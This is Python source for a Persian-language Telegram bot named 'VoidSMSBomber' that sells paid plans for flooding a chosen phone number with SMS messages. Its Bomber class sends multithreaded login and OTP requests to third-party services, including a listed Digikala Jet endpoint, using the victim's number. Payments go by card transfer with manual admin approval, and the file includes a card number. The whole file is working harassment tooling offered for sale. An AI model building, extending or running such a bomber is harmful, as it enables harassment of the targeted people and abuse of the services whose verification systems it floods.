import random
import threading
import time
import requests
import phonenumbers
import os
import json
import telebot
from telebot import types
from flask import Flask

# ==========================================
# 1. وب‌سرور برای سلامت پورت (Render)
# ==========================================
app = Flask(__name__)
@app.route('/')
def health(): return "Bot is running!", 200
def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, use_reloader=False)
threading.Thread(target=run_web, daemon=True).start()

# ==========================================
# 2. تنظیمات و دیتابیس
# ==========================================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = 6914309071
CARD_NUMBER = "6219861451091986"
DB_FILE = "users_db.json"
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(db):
    with open(DB_FILE, "w") as f: json.dump(db, f)

# متغیرهای موقت در حافظه
user_states = {}       # وضعیت انتخاب پلن
pending_approvals = {} # درخواست‌های در انتظار تایید
active_bombers = {}    # کاربرانی که در حال ارسال هستند

PLANS = {
    "basic": {"name": "پایه (Basic)", "price": 150, "uses": 10, "desc": "۱۰ ارسال | سرعت معمولی"},
    "pro": {"name": "حرفه‌ای (Pro)", "price": 450, "uses": 50, "desc": "۵۰ ارسال | سرعت بالا"},
    "vip": {"name": "ویژه (VIP)", "price": 600, "uses": 9999, "desc": "نامحدود | سرعت اولترا"}
}

# ==========================================
# 3. هسته بمبر (Bomber Core)
# ==========================================
class Bomber:
    def __init__(self, phone_number, user_id):
        self.phone_number = phone_number
        self.user_id = user_id
        self.services = []
        self.load_services()
        self.session = requests.Session()
        self.stop_event = threading.Event()
        self.success = 0
        self.fail = 0

    def load_services(self):
        # ⚠️⚠️⚠️ لیست کامل سرویس‌های خودت رو دقیقاً اینجا کپی کن ⚠️⚠️⚠️
        self.services = [
            {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            # ...
        ]

    def send_request(self, service):
        if self.stop_event.is_set(): return
        try:
            data = service['data']()
            headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
            method = service['method'].upper()
            use_json = service.get('json', False)

            if method == 'POST':
                if use_json: resp = self.session.post(service['url'], json=data, headers=headers, timeout=5)
                else: resp = self.session.post(service['url'], data=data, headers=headers, timeout=5)
            else:
                resp = self.session.get(service['url'], params=data, headers=headers, timeout=5)

            if resp.status_code in (200, 201, 202, 204): self.success += 1
            else: self.fail += 1
        except:
            self.fail += 1

    def worker(self, subset):
        for service in subset:
            if self.stop_event.is_set(): break
            self.send_request(service)
            time.sleep(0.3)

    def start(self):
        if not self.services:
            bot.send_message(self.user_id, "❌ خطا: لیست سرویس‌ها خالی است.")
            return
            
        self.success = 0
        self.fail = 0
        chunk_size = max(1, len(self.services) // 15)
        chunks = [self.services[i:i + chunk_size] for i in range(0, len(self.services), chunk_size)]
        
        threads = []
        for chunk in chunks:
            t = threading.Thread(target=self.worker, args=(chunk,))
            t.start()
            threads.append(t)
            
        for t in threads: t.join()
        
        bot.send_message(self.user_id, f"🏁 **پایان عملیات!**\n✅ موفق: {self.success}\n❌ ناموفق: {self.fail}", parse_mode='Markdown')
        if self.user_id in active_bombers: del active_bombers[self.user_id]

# ==========================================
# 4. منوها و دکمه‌های ربات
# ==========================================
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🚀 اجرای بمبر", callback_data="menu_bomb"),
        types.InlineKeyboardButton("🛒 خرید / ارتقای پلن", callback_data="menu_buy"),
        types.InlineKeyboardButton("📋 حساب کاربری من", callback_data="menu_profile")
    )
    return markup

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = str(message.from_user.id)
    db = load_db()
    if user_id not in db:
        db[user_id] = {"plan": "none", "uses": 0}
        save_db(db)
        
    text = (
        "سلام! 👋\n"
        "به ربات **VoidSMSBomber** خوش آمدید.\n"
        "از منوی زیر انتخاب کنید:"
    )
    bot.send_message(message.chat.id, text, reply_markup=main_menu(), parse_mode='Markdown')

@bot.message_handler(commands=['admin'])
def cmd_admin(message):
    if message.from_user.id != ADMIN_ID: return
    db = load_db()
    total_users = len(db)
    total_sales = sum([p['uses'] for u, p in db.items() if p['uses'] > 0]) # محاسبه تقریبی
    
    text = (
        "👑 **پنل مدیریت**\n\n"
        f"👥 تعداد کل کاربران: {total_users}\n"
        f"📊 تعداد کل ارسال‌های باقیمانده: {total_sales}\n"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = str(call.from_user.id)
    db = load_db()
    
    if call.data == "menu_back":
        bot.edit_message_text("منوی اصلی:", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
    
    elif call.data == "menu_profile":
        if user_id in db:
            plan_name = PLANS[db[user_id]['plan']]['name'] if db[user_id]['plan'] in PLANS else "بدون پلن"
            uses = db[user_id].get('uses', 0)
            text = f"📋 **پروفایل شما:**\n\n💎 پلن فعلی: **{plan_name}**\n⚡️ تعداد استفاده باقی‌مانده: **{uses}**"
        else:
            text = "❌ شما هنوز ثبت‌نام نکرده‌اید. /start را بزنید."
        
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_buy":
        text = "🛒 **لیست پلن‌های اشتراکی:**\n\n"
        markup = types.InlineKeyboardMarkup(row_width=1)
        for key, plan in PLANS.items():
            text += f"🔹 **{plan['name']}** | {plan['price']} تومان\n"
            text += f"_{plan['desc']}_\n\n"
            markup.add(types.InlineKeyboardButton(f"خرید {plan['name']}", callback_data=f"buy_{key}"))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data.startswith("buy_"):
        plan_key = call.data.replace("buy_", "")
        user_states[user_id] = {"selected_plan": plan_key}
        plan = PLANS[plan_key]
        text = (
            f"✅ پلن **{plan['name']}** انتخاب شد.\n\n"
            f"💳 مبلغ **{plan['price']} هزار تومان** را به شماره کارت زیر واریز کنید:\n"
            f"`{CARD_NUMBER}`\n\n"
            "📸 سپس **عکس رسید** را همینجا ارسال کنید."
        )
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_buy"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_bomb":
        if user_id in active_bombers:
            bot.answer_callback_query(call.id, "⚠️ شما یک عملیات در حال اجرا دارید!", show_alert=True)
            return
            
        if user_id not in db or db[user_id].get('uses', 0) <= 0:
            bot.answer_callback_query(call.id, "❌ اعتبار کافی ندارید! ابتدا پلن بخرید.", show_alert=True)
            return
            
        bot.send_message(call.message.chat.id, "📞 لطفاً شماره را با فرمت زیر ارسال کنید:\n`/bomb 09123456789`", parse_mode='Markdown')

    # دکمه‌های ادمین
    elif call.data.startswith("admin_approve_"):
        req_id = call.data.replace("admin_approve_", "")
        if req_id in pending_approvals:
            data = pending_approvals[req_id]
            uid, plan_key = data["user_id"], data["plan"]
            plan = PLANS[plan_key]
            
            if uid not in db: db[uid] = {"plan": plan_key, "uses": 0}
            db[uid]["plan"] = plan_key
            db[uid]["uses"] += plan["uses"]
            save_db(db)
            
            bot.edit_message_text(f"✅ تایید شد. {plan['uses']} اعتبار به کاربر {uid} داده شد.", call.message.chat.id, call.message.message_id)
            bot.send_message(uid, f"🎉 **پرداخت تایید شد!**\nپلن **{plan['name']}** با **{plan['uses']}** استفاده برای شما فعال شد.", parse_mode='Markdown')
            del pending_approvals[req_id]

    elif call.data.startswith("admin_reject_"):
        req_id = call.data.replace("admin_reject_", "")
        if req_id in pending_approvals:
            uid = pending_approvals[req_id]["user_id"]
            bot.edit_message_text("❌ رد شد.", call.message.chat.id, call.message.message_id)
            bot.send_message(uid, "❌ رسید شما توسط ادمین رد شد.")
            del pending_approvals[req_id]

# ==========================================
# 5. دریافت رسید و ارسال بمبر
# ==========================================
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = str(message.from_user.id)
    if user_id not in user_states or "selected_plan" not in user_states[user_id]:
        bot.reply_to(message, "⚠️ لطفاً ابتدا از منوی 'خرید پلن'، یک پلن انتخاب کنید و سپس رسید را بفرستید.")
        return
        
    plan_key = user_states[user_id]["selected_plan"]
    plan = PLANS[plan_key]
    req_id = f"{user_id}_{int(time.time())}"
    pending_approvals[req_id] = {"user_id": user_id, "plan": plan_key}
    
    bot.reply_to(message, "✅ رسید دریافت شد. منتظر تایید ادمین باشید.")
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تایید", callback_data=f"admin_approve_{req_id}"),
        types.InlineKeyboardButton("❌ رد", callback_data=f"admin_reject_{req_id}")
    )
    
    bot.send_message(ADMIN_ID, f"📩 **رسید جدید:**\nکاربر: `{user_id}`\nپلن: **{plan['name']}**", reply_markup=markup, parse_mode='Markdown')
    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    del user_states[user_id]

@bot.message_handler(commands=['bomb'])
def cmd_bomb(message):
    user_id = str(message.from_user.id)
    db = load_db()
    
    if user_id in active_bombers:
        bot.reply_to(message, "⚠️ شما یک عملیات در حال انجام دارید. صبر کنید تا تمام شود.")
        return
        
    if user_id not in db or db[user_id].get('uses', 0) <= 0:
        bot.reply_to(message, "❌ اعتبار کافی ندارید! لطفاً از منو پلن بخرید.")
        return
        
    try:
        phone = message.text.split()[1]
    except IndexError:
        bot.reply_to(message, "❌ فرمت اشتباه است. مثال:\n`/bomb 09123456789`", parse_mode='Markdown')
        return

    if not phone.startswith("+"):
        phone = "+98" + phone.lstrip("0")
        
    # کم کردن اعتبار
    db[user_id]["uses"] -= 1
    save_db(db)
    
    bot.reply_to(message, f"🚀 **عملیات آغاز شد!**\n📞 هدف: `{phone}`\n(۱ اعتبار کسر شد. منتظر نتیجه باشید...)", parse_mode='Markdown')
    
    bomber = Bomber(phone, user_id)
    active_bombers[user_id] = bomber
    threading.Thread(target=bomber.start).start()

if __name__ == "__main__":
    print("🤖 Bot & Web Server running...")
    bot.infinity_polling()
